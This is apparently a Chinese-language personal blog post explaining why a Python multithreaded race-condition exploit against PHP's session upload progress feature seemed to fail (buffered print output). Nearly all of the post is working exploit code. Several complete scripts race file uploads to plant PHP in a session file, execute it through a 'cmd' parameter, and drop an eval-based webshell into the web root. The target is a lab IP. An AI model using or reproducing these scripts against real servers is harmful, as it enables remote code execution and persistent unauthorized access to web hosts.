---
title: python 多线程条件竞争利用失败print不显示的原因
abbrlink: 27003
date: 2024-06-14 21:49:07
tags:
---

如下脚本，利用php的PHP_SESSION_UPLOAD_PROGRESS条件竞争漏洞执行一直着没反应：

```python

import requests
import threading
import sys


session = requests.session()
sess = 'zzx'
url1 = "http://192.168.50.162/a.php"
flag=''
# file后为phpsession的路径
data1 = {
    'PHP_SESSION_UPLOAD_PROGRESS': "<?php echo 'pwdd';file_put_contents('/var/www/html/1.php','<?php phpinfo();eval($_POST[1]); ?>');?>"
}
data2 = {
    'cmd' : 'php /var/lib/php/sessions/sess_'+sess
}
file = {
    'file': 'abc'
}
cookies = {
    'PHPSESSID': sess
}

def write():
    while True:
        r = session.post(url1, data=data1, files=file, cookies=cookies)

def read():
    while True:
        r = session.post(url1, data=data2)
        if 'pwdd' in r.text:
            print(r.text)
            return
            
    

t=threading.Thread(target=write)
t.setDaemon(True)
t.start()
read()
```
但是拆成两个脚本同时运行可以成功

```python

import requests
import threading
import sys


session = requests.session()
sess = 'zzx'
url1 = "http://192.168.50.162/a.php"

data2 = {
    'cmd' : 'php /var/lib/php/sessions/sess_'+sess
}


while True:
    r = session.post(url1, data=data2)
    if 'pwdd' in r.text:
        print(r.text)
   
```

```python

import requests
import threading
import sys


session = requests.session()
sess = 'zzx'
url1 = "http://192.168.50.162/a.php"

flag=''
# file后为phpsession的路径
data1 = {
    'PHP_SESSION_UPLOAD_PROGRESS': "<?php echo 'pwdd';file_put_contents('/var/www/html/1.php','<?php phpinfo();eval($_POST[1]); ?>');?>"
}
file = {
    'file': 'abc'
}
cookies = {
    'PHPSESSID': sess
}


while True:
    r = session.post(url1, data=data1, files=file, cookies=cookies)
```

经过研究发现实际上是利用成功的，无非是print不显示，之后查到了这个原因：https://stackoverflow.com/a/43736208/10096812
需要把print改为`print('Your text', flush=True)`以刷新缓冲区。

改进了脚本就可以了：

```python

import requests
import threading
import sys


session = requests.session()
sess = 'zzx'
url1 = "http://192.168.50.162/a.php"

flag=''
# file后为phpsession的路径
data1 = {
    'PHP_SESSION_UPLOAD_PROGRESS':"<?php echo 'pwdd';file_put_contents('/var/www/html/1.php','<?php phpinfo();eval($_POST[1]); ?>');?>"
}
data2 = {
    'cmd' : 'php /var/lib/php/sessions/sess_'+sess
}
print(data2)
file = {
    'file': 'abc'
}
cookies = {
    'PHPSESSID': sess
}

def write():
    print(2, flush=True)
    while True:
        r = session.post(url1, data=data1, files=file, cookies=cookies)


def read():
    print(1, flush=True)
    while True:
        r = session.post(url1, data=data2)
        if 'pwdd' in r.text:
            print(r.text, flush=True)
            return
            
t=threading.Thread(target=write)
t.setDaemon(True)
t.start()
read()
```

